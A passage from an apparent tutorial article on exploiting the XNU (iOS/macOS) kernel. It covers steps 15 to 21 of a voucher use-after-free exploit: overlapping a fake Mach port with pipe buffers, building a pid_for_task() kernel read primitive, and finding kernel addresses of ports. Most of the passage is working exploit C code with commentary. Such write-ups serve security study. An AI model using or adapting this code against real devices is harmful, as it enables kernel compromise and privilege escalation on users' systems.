    				<span class="k">if</span> <span class="p">(</span><span class="n">ool_voucher_port</span> <span class="o">!=</span> <span class="n">uaf_voucher_port</span><span class="p">)</span> <span class="p">{</span>
    					<span class="n">ERROR</span><span class="p">(</span><span class="s">"voucher port mismatch"</span><span class="p">);</span>
    				<span class="p">}</span>
    				<span class="k">if</span> <span class="p">(</span><span class="n">fake_port</span> <span class="o">!=</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
    					<span class="n">ERROR</span><span class="p">(</span><span class="s">"multiple fake ports"</span><span class="p">);</span>
    				<span class="p">}</span>
    				<span class="n">fake_port</span> <span class="o">=</span> <span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    				<span class="n">ool_ports</span><span class="p">[</span><span class="n">voucher_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">MACH_PORT_NULL</span><span class="p">;</span>
    				<span class="n">INFO</span><span class="p">(</span><span class="s">"received fake port 0x%x"</span><span class="p">,</span> <span class="n">fake_port</span><span class="p">);</span>
    			<span class="p">}</span>
    		<span class="p">});</span>
    	<span class="p">});</span>
    	<span class="c1">// Make sure we got a fake port.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">MACH_PORT_VALID</span><span class="p">(</span><span class="n">fake_port</span><span class="p">))</span> <span class="p">{</span>
    		<span class="k">if</span> <span class="p">(</span><span class="n">fake_port</span> <span class="o">==</span> <span class="n">MACH_PORT_NULL</span><span class="p">)</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"did not receive a fake port in OOL ports spray"</span><span class="p">);</span>
    		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    			<span class="n">ERROR</span><span class="p">(</span><span class="s">"received an invalid fake port in OOL ports spray"</span><span class="p">);</span>
    		<span class="p">}</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-15-find-overlapping-pipefds">Step 15: Find overlapping pipefds</h4>

<p>Next, we need to identify that out of the all the pipe buffers that we created, which one overlaps with the fake port. To do that, we use the API <strong>mach_port_kobject</strong> to get the <strong>IKOT_TYPE</strong> value of the <strong>fake_port</strong> and this value should be the index of the pipe, because if you remember, in Step 4, we were creating ports within the pipe buffers and for each port that we created, we were overalapping the <strong>IKOT_TYPE</strong> with the index of the pipe buffer. Using this, we can identify which <strong>pipefds</strong> our fake port is overlapping with.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 15\. Check which pair of pipefds overlaps our port using mach_port_kobject(). The</span>
    	<span class="c1">// returned type value will be the lower 12 bits of the ipc_port's ip_bits field, which</span>
    	<span class="c1">// we've set to the index of the pipe overlapping the port during our spray.</span>
    	<span class="c1">//</span>
    	<span class="c1">// This is the third and final risky part: we could panic if our fake port doesn't actually</span>
    	<span class="c1">// point into our pipe buffers. After this, though, it's all smooth sailing.</span>
    	<span class="n">natural_t</span> <span class="n">type</span><span class="p">;</span>
    	<span class="n">mach_vm_address_t</span> <span class="n">addr</span><span class="p">;</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_kobject</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">type</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_port_kobject"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not determine the pipe index of our port"</span><span class="p">);</span>
    	<span class="p">}</span>
    	<span class="kt">size_t</span> <span class="n">pipe_index</span> <span class="o">=</span> <span class="n">type</span><span class="p">;</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"port is at pipe index %zu"</span><span class="p">,</span> <span class="n">pipe_index</span><span class="p">);</span>
    	<span class="c1">// Get the pipefds that allow us to control the port.</span>
    	<span class="kt">int</span> <span class="o">*</span><span class="n">port_pipefds</span> <span class="o">=</span> <span class="n">pipefds_array</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">pipe_index</span><span class="p">;</span>
    	<span class="n">pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">port_pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    	<span class="n">pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">port_pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    	<span class="n">port_pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">port_pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span></code></pre></figure>

<h4 id="step-16-clean-up-the-unused-memory">Step 16: Clean up the unused memory</h4>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 16\. Clean up unneeded resources: terminate the ith_voucher thread, discard the filler</span>
    	<span class="c1">// ports, and close the sprayed pipes.</span>
    	<span class="n">thread_terminate</span><span class="p">(</span><span class="kr">thread</span><span class="p">);</span>
    	<span class="n">destroy_ports</span><span class="p">(</span><span class="n">filler_ports</span><span class="p">,</span> <span class="n">filler_port_count</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">filler_ports</span><span class="p">);</span>
    	<span class="n">close_pipes</span><span class="p">(</span><span class="n">pipefds_array</span><span class="p">,</span> <span class="n">pipe_count</span><span class="p">);</span>
    	<span class="n">free</span><span class="p">(</span><span class="n">pipefds_array</span><span class="p">);</span></code></pre></figure>

<h4 id="step-17-set-up-primitive-to-find-the-address-of-the-base-port">Step 17: Set up primitive to find the address of the base port</h4>

<p>We have a fake port overlapping with the content of the pipe buffer, that we can read and write into since we know which pipe buffer is it. Now our task is to create a <strong>fake port</strong> such that we can use the <strong>pid_for_task()</strong> technique with it to read 4 bytes of kernel memory at a time. This technique was discussed in the Part 1 of this article.</p>

<p><img src="/images/pid.png" alt="Pid" /></p>

<p>But what this also means is that our fake task’s <strong>kobject</strong> field should point to a task struct that we control, so that we can have a look at the <strong>bsd_info</strong> field of the task that points to a <strong>proc</strong> struct. Ideally, the fake port along with the fake task should both be in the pipe buffers, so we can read and write into them. In order to find that out, we send the mach api call <strong>mach_port_request_notification()</strong> to the fake port to add a request that if the fake port becomes a dead name (<strong>MACH_PORT_DEAD</strong>), the base port will be notified. This causes our fake port’s <strong>ip_requests</strong> field to point to an array that contains a pointer to the <strong>base_port</strong> address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 17\. Use mach_port_request_notification() to put a pointer to an array containing</span>
    	<span class="c1">// base_port in our port's ip_requests field.</span>
    	<span class="n">mach_port_t</span> <span class="n">prev_notify</span><span class="p">;</span>
    	<span class="n">kr</span> <span class="o">=</span> <span class="n">mach_port_request_notification</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">(),</span> <span class="n">fake_port</span><span class="p">,</span>
    			<span class="n">MACH_NOTIFY_DEAD_NAME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
    			<span class="n">base_port</span><span class="p">,</span> <span class="n">MACH_MSG_TYPE_MAKE_SEND_ONCE</span><span class="p">,</span>
    			<span class="o">&amp;</span><span class="n">prev_notify</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"mach_port_request_notification"</span><span class="p">,</span>
    				<span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not request a notification for the fake port"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">assert</span><span class="p">(</span><span class="n">prev_notify</span> <span class="o">==</span> <span class="n">MACH_PORT_NULL</span><span class="p">);</span></code></pre></figure>

<h4 id="step-18-find-the-address-of-the-base-port">Step 18: Find the address of the base port</h4>

<p>We read from the overlapping pipe buffer and iterate though the whole buffer as ports, look at each possible port’s <strong>ip_requests</strong> field, and if we find that field, we know that it contains the address of an array that contains a pointer to <strong>base_port</strong>, because this is the only port we have set a notification for. Note that we still can’t read that address yet. We save the offset of that fake port within the pipe buffer. Then we write to the pipe so the data from the pipe can now be read later on. We now know exactly at what offset the fake port lies in the pipe buffer and within which pipe buffer it lies (we already found that out before). We also know the address of <strong>ip_requests</strong> so we need a way to read from that address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 18\. Now read back our pipe buffer to discover the value of ip_requests (and get our</span>
    	<span class="c1">// first kernel pointer!). This also tells us where our port is located inside the pipe</span>
    	<span class="c1">// buffer.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="n">__block</span> <span class="kt">uint64_t</span> <span class="n">ip_requests</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="n">iterate_ipc_ports</span><span class="p">(</span><span class="n">pipe_buffer_size</span><span class="p">,</span> <span class="o">^</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">port_offset</span><span class="p">,</span> <span class="n">bool</span> <span class="o">*</span><span class="n">stop</span><span class="p">)</span> <span class="p">{</span>
    		<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">port</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">port_offset</span><span class="p">;</span>
    		<span class="kt">uint64_t</span> <span class="o">*</span><span class="n">port_ip_requests</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">port</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_requests</span><span class="p">));</span>
    		<span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">port_ip_requests</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    			<span class="c1">// We've found the overlapping port. Record the offset of the fake port,</span>
    			<span class="c1">// save the ip_requests array, and set the field in the port to NULL.</span>
    			<span class="n">assert</span><span class="p">(</span><span class="n">ip_requests</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
    			<span class="n">fake_port_offset</span> <span class="o">=</span> <span class="n">port_offset</span><span class="p">;</span>
    			<span class="n">ip_requests</span> <span class="o">=</span> <span class="o">*</span><span class="n">port_ip_requests</span><span class="p">;</span>
    			<span class="o">*</span><span class="n">port_ip_requests</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    			<span class="c1">// Clear out all the other fake ports.</span>
    			<span class="n">memset</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">(</span><span class="n">ipc_port</span><span class="p">));</span>
    		<span class="p">}</span>
    	<span class="p">});</span>
    	<span class="c1">// Make sure we found it.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">ip_requests</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not find %s in pipe buffers"</span><span class="p">,</span> <span class="s">"ip_requests"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"got %s at 0x%016llx"</span><span class="p">,</span> <span class="s">"ip_requests"</span><span class="p">,</span> <span class="n">ip_requests</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"fake port is at offset %zu"</span><span class="p">,</span> <span class="n">fake_port_offset</span><span class="p">);</span>
    	<span class="c1">// Do a write so that the stage0 and stage1 read primitives can start with a pipe read.</span>
    	<span class="n">write_pipe</span><span class="p">();</span></code></pre></figure>

<h4 id="step-19-find-the-address-of-the-base-port">Step 19: Find the address of the base port</h4>

<p>We can find the address of the base port pointer since its at a fixed offset from the <strong>ip_requests</strong> field. Next, we need to find out the address of the base port from the base port pointer using which we can locate our pipe buffer address. However, as discussed a bit earlier, in order to create a proper fake port on which you can use <strong>task_for_pid()</strong> on, you must have a <strong>kobject</strong> field pointing to an address that corresponds to a task. Also, the task will have a <strong>bsd_info</strong> pointing to a proc. This is achieved by creating a fake port of type <strong>IKOT_NONE</strong>, creating a fake task and setting the <strong>bsd_info</strong> field pointing to the (<strong>AddressToRead - OFFSET(pidInProcStruct)</strong>), and then sending that fask task in a mach message to the fake port. By looking at the port’s <strong>ip_messages.imq_messages</strong> field via the pipe we can get the address of the <strong>ipc_kmsg</strong> struct containing the task address, and then replace the port to an <strong>IKOT_TASK</strong> port with the <strong>kobject</strong> field pointing tot the fake task. Now that we have built an initial read primitive, we can then use the function <strong>stage0_read64</strong> to read the <strong>base_port</strong> address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 19\. Now that we know the address of an array that contains a pointer to base_port, we</span>
    	<span class="c1">// need a way to read data from that address so we can locate our pipe buffer in memory.</span>
    	<span class="c1">//</span>
    	<span class="c1">// We'll use the traditional pid_for_task() technique to read 4 bytes of kernel memory.</span>
    	<span class="c1">// However, in order for this technique to work, we need to get a fake task containing an</span>
    	<span class="c1">// offset pointer to the address we want to read at a known location in memory. We can do</span>
    	<span class="c1">// that by initializing our fake port, sending a Mach message containing our fake task to</span>
    	<span class="c1">// the port, and reading out the port's imq_messages field.</span>
    	<span class="c1">//</span>
    	<span class="c1">// An unfortunate consequence of this technique is that each 4-byte read leaks an ipc_kmsg</span>
    	<span class="c1">// allocation. Thus, we'll store the leaked kmsgs so that we can deallocate them later.</span>
    	<span class="kt">uint64_t</span> <span class="n">leaked_kmsgs</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
    	<span class="kt">uint64_t</span> <span class="n">address_of_base_port_pointer</span> <span class="o">=</span> <span class="n">ip_requests</span>
    		<span class="o">+</span> <span class="mi">1</span> <span class="o">*</span> <span class="nf">SIZE</span><span class="p">(</span><span class="n">ipc_port_request</span><span class="p">)</span> <span class="o">+</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">ipc_port_request</span><span class="p">,</span> <span class="n">ipr_soright</span><span class="p">);</span>
    	<span class="n">base_port_address</span> <span class="o">=</span> <span class="n">stage0_read64</span><span class="p">(</span><span class="n">address_of_base_port_pointer</span><span class="p">,</span> <span class="n">leaked_kmsgs</span><span class="p">);</span>
    	<span class="n">INFO</span><span class="p">(</span><span class="s">"base port is at 0x%016llx"</span><span class="p">,</span> <span class="n">base_port_address</span><span class="p">);</span>
    	<span class="c1">// Check that it has the offset that we expect.</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">base_port_address</span> <span class="o">%</span> <span class="n">pipe_buffer_size</span> <span class="o">!=</span> <span class="n">fake_port_offset</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"base_port at wrong offset"</span><span class="p">);</span>
    	<span class="p">}</span></code></pre></figure>

<p>The <strong>stage0_read</strong> is a really handy function and basically does the job of reading out the kernel memory 32 bits at a time. It basically does the following steps.</p>

<ol>
  <li>Create a fake port in the pipe, set all the required properties and set the <strong>IKOT</strong> type as <strong>IKOT_NONE</strong></li>
  <li>Create a fake task, set the <strong>bsd_info</strong> field depending on the address you want to read and send it to the port in a mach message.</li>
  <li>Read the receiver port contents by reading the pipe and finds the address of the task from its <strong>imq_messages</strong> field.</li>
  <li>Rewrite the port by rewriting the pipe and now set the <strong>IKOT</strong> type as <strong>IKOT_TASK</strong> to create it as a fake task port so one can use the <strong>task_for_pid()</strong> call on it</li>
  <li>Call <strong>pid_for_task</strong> to read kernel memory</li>
</ol>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="o">*</span>
     <span class="o">*</span> <span class="n">stage0_read32</span>
     <span class="o">*</span>
     <span class="o">*</span> <span class="n">Description</span><span class="o">:</span>
     <span class="o">*</span> 	<span class="n">Read</span> <span class="n">a</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">value</span> <span class="n">from</span> <span class="n">memory</span> <span class="n">using</span> <span class="n">our</span> <span class="n">fake</span> <span class="n">port</span><span class="p">.</span>
     <span class="o">*</span>
     <span class="o">*</span> 	<span class="n">Note</span> <span class="n">that</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">very</span> <span class="n">first</span> <span class="n">read</span> <span class="n">primitive</span> <span class="n">we</span> <span class="n">get</span><span class="p">,</span> <span class="n">before</span> <span class="n">we</span> <span class="n">know</span> <span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span>
     <span class="o">*</span> 	<span class="n">pipe</span> <span class="n">buffers</span><span class="p">.</span> <span class="n">Each</span> <span class="mi">32</span><span class="o">-</span><span class="n">bit</span> <span class="n">read</span> <span class="n">leaks</span> <span class="n">an</span> <span class="n">ipc_kmsg</span><span class="p">.</span> <span class="n">We</span><span class="err">'</span><span class="n">ll</span> <span class="n">want</span> <span class="n">to</span> <span class="n">use</span> <span class="n">this</span> <span class="n">primitive</span> <span class="n">to</span> <span class="n">get</span>
     <span class="o">*</span> 	<span class="n">the</span> <span class="n">address</span> <span class="n">of</span> <span class="n">our</span> <span class="n">pipe</span> <span class="n">buffers</span> <span class="n">as</span> <span class="n">quickly</span> <span class="n">as</span> <span class="n">possible</span><span class="p">.</span>
     <span class="o">*</span>
     <span class="o">*</span> 	<span class="n">This</span> <span class="n">routine</span> <span class="n">performs</span> <span class="mi">2</span> <span class="n">full</span> <span class="n">pipe</span> <span class="n">transfers</span><span class="p">,</span> <span class="n">starting</span> <span class="n">with</span> <span class="n">a</span> <span class="n">read</span><span class="p">.</span>
     <span class="err">*/</span>
    <span class="k">static</span> <span class="kt">uint32_t</span>
    <span class="nf">stage0_read32</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">kmsg</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Do a read to make the pipe available for a write.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="c1">// Initialize the port as a regular Mach port that's empty and has room for 1 message.</span>
    	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">fake_port_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">pipe_buffer</span> <span class="o">+</span> <span class="n">fake_port_offset</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>      <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_NONE</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">waitq_flags</span><span class="p">,</span>  <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">mach_port_waitq_flags</span><span class="p">();</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_messages</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_msgcount</span><span class="p">,</span> <span class="kt">uint16_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_qlimit</span><span class="p">,</span>   <span class="kt">uint16_t</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// We'll pretend that the 32-bit value we want to read is the p_pid field of a proc struct.</span>
    	<span class="c1">// Then, we'll get a pointer to that fake proc at a known address in kernel memory by</span>
    	<span class="c1">// sending the pointer to the fake proc in a Mach message to the fake port.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_proc_address</span> <span class="o">=</span> <span class="n">address</span> <span class="o">-</span> <span class="n">OFFSET</span><span class="p">(</span><span class="n">proc</span><span class="p">,</span> <span class="n">p_pid</span><span class="p">);</span>
    	<span class="kt">uint64_t</span> <span class="n">offset_from_kmsg_to_fake_task</span><span class="p">;</span>
    	<span class="n">stage0_send_fake_task_message</span><span class="p">(</span><span class="n">fake_proc_address</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset_from_kmsg_to_fake_task</span><span class="p">);</span>
    	<span class="c1">// Read back the port contents to get the address of the ipc_kmsg containing our fake proc</span>
    	<span class="c1">// pointer.</span>
    	<span class="n">read_pipe</span><span class="p">();</span>
    	<span class="kt">uint64_t</span> <span class="n">kmsg_address</span> <span class="o">=</span> <span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">imq_messages</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">);</span>
    	<span class="o">*</span><span class="n">kmsg</span> <span class="o">=</span> <span class="n">kmsg_address</span><span class="p">;</span>
    	<span class="c1">// Now rewrite the port as a fake task port pointing to our fake task.</span>
    	<span class="kt">uint64_t</span> <span class="n">fake_task_address</span> <span class="o">=</span> <span class="n">kmsg_address</span> <span class="o">+</span> <span class="n">offset_from_kmsg_to_fake_task</span><span class="p">;</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_bits</span><span class="p">,</span>    <span class="kt">uint32_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">io_makebits</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">IOT_PORT</span><span class="p">,</span> <span class="n">IKOT_TASK</span><span class="p">);</span>
    	<span class="n">FIELD</span><span class="p">(</span><span class="n">fake_port_data</span><span class="p">,</span> <span class="n">ipc_port</span><span class="p">,</span> <span class="n">ip_kobject</span><span class="p">,</span> <span class="kt">uint64_t</span><span class="p">)</span> <span class="o">=</span> <span class="n">fake_task_address</span><span class="p">;</span>
    	<span class="n">write_pipe</span><span class="p">();</span>
    	<span class="c1">// Now use pid_for_task() to read our value.</span>
    	<span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">pid_for_task</span><span class="p">(</span><span class="n">fake_port</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pid</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"%s returned %d: %s"</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">,</span> <span class="n">kr</span><span class="p">,</span> <span class="n">mach_error_string</span><span class="p">(</span><span class="n">kr</span><span class="p">));</span>
    		<span class="n">ERROR</span><span class="p">(</span><span class="s">"could not read kernel memory in stage %d using %s"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"pid_for_task"</span><span class="p">);</span>
    		<span class="n">fail</span><span class="p">();</span>
    	<span class="p">}</span>
    	<span class="k">return</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span> <span class="n">pid</span><span class="p">;</span>
    <span class="p">}</span></code></pre></figure>

<h4 id="step-20-compute-the-address-of-the-fake-port">Step 20: Compute the address of the fake port</h4>

<p>Since we know the <strong>base_port</strong> address and given the fact that we know the offset from the base port to the fake port (we defined this earlier in Step 3), it is possible for us to calculate the fake port address.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 20\. Now use base_port_address to compute the address of the fake port and the containing</span>
    	<span class="c1">// pipe buffer, and choose an offset for our fake task in the pipe buffer as well. At this</span>
    	<span class="c1">// point, we can now use our stage 1 read primitive.</span>
    	<span class="n">fake_port_address</span> <span class="o">=</span> <span class="n">base_port_address</span> <span class="o">+</span> <span class="n">base_port_to_fake_port_offset</span><span class="p">;</span>
    	<span class="n">pipe_buffer_address</span> <span class="o">=</span> <span class="n">fake_port_address</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="n">pipe_buffer_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    	<span class="n">fake_task_offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">fake_port_offset</span> <span class="o">&lt;</span> <span class="n">FAKE_TASK_SIZE</span><span class="p">)</span> <span class="p">{</span>
    		<span class="n">fake_task_offset</span> <span class="o">=</span> <span class="n">pipe_buffer_size</span> <span class="o">-</span> <span class="n">FAKE_TASK_SIZE</span><span class="p">;</span>
    	<span class="p">}</span></code></pre></figure>

<h4 id="step-21-compute-the-address-of-your-own-task-port">Step 21: Compute the address of your own task port</h4>

<p>Now that we know the address of the fake task and we can create the port, we can create a better read primitive and call it stage 1. The next step is to compute the address of your own task port. The function <strong>stage1_find_port_address</strong> takes the input as a task and gets the address of the task port using the stage 1 read primtive.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c">    <span class="c1">// 21\. Now that we have the address of our pipe buffer, we can use the stage 1 read</span>
    	<span class="c1">// primitive. Get the address of our own task port, which we'll need later.</span>
    	<span class="kt">uint64_t</span> <span class="n">task_port_address</span> <span class="o">=</span> <span class="n">stage1_find_port_address</span><span class="p">(</span><span class="n">mach_task_self</span><span class="p">());</span>
    <span class="cm">/*
     * stage1_find_port_address
     *
     * Description:
     * 	Get the address of a Mach port to which we hold a send right.
     */</span>
    <span class="k">static</span> <span class="kt">uint64_t</span>
    <span class="nf">stage1_find_port_address</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">port</span><span class="p">)</span> <span class="p">{</span>
    	<span class="c1">// Create the message. We'll place a send right to the target port in msgh_local_port.</span>
    	<span class="n">mach_msg_header_t</span> <span class="n">msg</span> <span class="o">=</span> <span class="p">{};</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_bits</span>        <span class="o">=</span> <span class="n">MACH_MSGH_BITS_SET</span><span class="p">(</span><span class="n">MACH_MSG_TYPE_MAKE_SEND</span><span class="p">,</span> <span class="n">MACH_MSG_TYPE_COPY_SEND</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_remote_port</span> <span class="o">=</span> <span class="n">base_port</span><span class="p">;</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_local_port</span>  <span class="o">=</span> <span class="n">port</span><span class="p">;</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_size</span>        <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
    	<span class="n">msg</span><span class="p">.</span><span class="n">msgh_id</span>          <span class="o">=</span> <span class="err">'</span><span class="n">port</span><span class="err">'</span><span class="p">;</span>
    	<span class="c1">// Send the message to the base port.</span>
    	<span class="n">kern_return_t</span> <span class="n">kr</span> <span class="o">=</span> <span class="n">mach_msg</span><span class="p">(</span>
    			<span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span>
    			<span class="n">MACH_SEND_MSG</span> <span class="o">|</span> <span class="n">MACH_SEND_TIMEOUT</span><span class="p">,</span>
    			<span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">),</span>
    			<span class="mi">0</span><span class="p">,</span>
    			<span class="n">MACH_PORT_NULL</span><span class="p">,</span>
    			<span class="mi">0</span><span class="p">,</span>
    			<span class="n">MACH_PORT_NULL</span><span class="p">);</span>
    	<span class="k">if</span> <span class="p">(</span><span class="n">kr</span> <span class="o">!=</span> <span class="n">KERN_SUCCESS</span><span class="p">)</span> <span class="p">{</span>
